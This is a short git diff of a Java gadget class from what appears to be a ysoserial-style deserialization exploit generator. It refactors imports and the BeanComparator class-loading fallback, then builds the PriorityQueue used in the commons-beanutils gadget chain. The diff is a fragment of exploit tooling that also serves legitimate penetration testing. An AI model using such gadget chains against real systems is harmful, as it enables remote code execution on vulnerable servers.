@@ -3,10 +3,7 @@ package com.h2tg.ysogate.payloads.gadgets;
 import com.h2tg.ysogate.payloads.ObjectPayload;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.config.Config;
-import com.h2tg.ysogate.utils.CtClassUtils;
-import com.h2tg.ysogate.utils.Gadgets;
-import com.h2tg.ysogate.utils.PayloadRunner;
-import com.h2tg.ysogate.utils.Reflections;
+import com.h2tg.ysogate.utils.*;
 import javassist.CtClass;
 import org.apache.commons.beanutils.BeanComparator;
 
@@ -27,11 +24,12 @@ public class CommonsBeanutils1183NOCC implements ObjectPayload<Object>
 
 		Class beanCompareClazz;
 		try {
-			// Check if class is already loaded
-			beanCompareClazz = Class.forName("org.apache.commons.beanutils.BeanComparator");
-		} catch (ClassNotFoundException e) {
 			beanCompareClazz = ctClass.toClass();
+		} catch (Exception e) {
+			beanCompareClazz = Class.forName("org.apache.commons.beanutils.BeanComparator");
 		}
+
+
 		BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
 		final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
 		queue.add("1");
